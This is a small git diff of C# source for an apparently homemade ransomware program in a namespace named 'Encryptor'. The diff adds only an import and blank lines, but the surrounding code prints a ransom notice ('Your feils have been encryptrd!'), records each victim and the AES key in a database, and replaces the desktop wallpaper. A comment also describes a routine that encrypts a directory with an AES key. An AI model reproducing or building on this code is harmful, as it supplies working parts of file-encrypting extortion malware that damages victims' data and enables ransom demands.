@@ -5,6 +5,7 @@ using System.Linq;
 using System.Collections.Generic;
 using System.Data.SqlClient;
 using System.Diagnostics;
+using System.Dynamic;
 using System.Net;
 using System.Net.Sockets;
 using System.Security.AccessControl;
@@ -31,12 +32,14 @@ namespace Encryptor
 
 			// getting paied
 			System.Console.WriteLine("Your feils have been encryptrd!");
+			
 			DB.addVictimToDB(aes);
 			
 			// Change wallpaper
 			Uri wallpaper = new Uri("https://vignette.wikia.nocookie.net/dragonballfanon/images/7/70/Random.png/revision/latest?cb=20161221030547");
 			Wallpaper.Set(wallpaper,Wallpaper.Style.Fill);
 		}
+
 		
 		/// <summary>
 		/// This function recives a directpry and a aes key and encrypts
